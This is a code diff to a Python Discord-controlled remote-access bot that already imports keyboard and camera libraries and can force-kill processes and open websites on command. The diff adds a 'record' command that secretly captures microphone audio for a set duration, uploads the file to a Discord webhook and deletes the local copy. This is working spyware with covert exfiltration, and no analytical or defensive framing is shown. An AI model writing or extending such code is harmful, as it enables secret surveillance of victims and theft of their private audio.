@@ -10,11 +10,12 @@ import requests
 import cv2
 import pynput
 import webbrowser
+import sounddevice as sd
+from scipy.io.wavfile import write
 
 
 TOKEN = ""
 WEBHOOK_URL = ""
-
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -199,6 +200,7 @@ async def on_message(message):
         os.remove("sound.m4a")
         os.system("TASKKILL /F /IM Microsoft.Media.Player.exe")
 
+
     elif message.content.startswith("web"):
         command = message.content
         command = command.replace("web ", "")
@@ -210,5 +212,22 @@ async def on_message(message):
         visit='http://{}'.format(site)
         webbrowser.open(visit)
     
+    elif message.content.startswith("record"):
+        command = message.content
+        command = command.replace("record ", "")
+        seconds = int(command)  # Duration of recording
 
+        fs = 44100  # Sample rate
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()  # Wait until recording is finished
+        write('recording.wav', fs, myrecording)  # Save as WAV file
+        
+        time_now = datetime.datetime.now()
+        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Audio recorded at " + str(time_now) + " for " + str(seconds) + " seconds")
+        with open("./recording.wav", "rb") as rec:
+            webhook.add_file(file=rec.read(), filename="recording.wav")
+        response = webhook.execute()
+        os.remove("./recording.wav")
+
+        
 client.run(TOKEN)
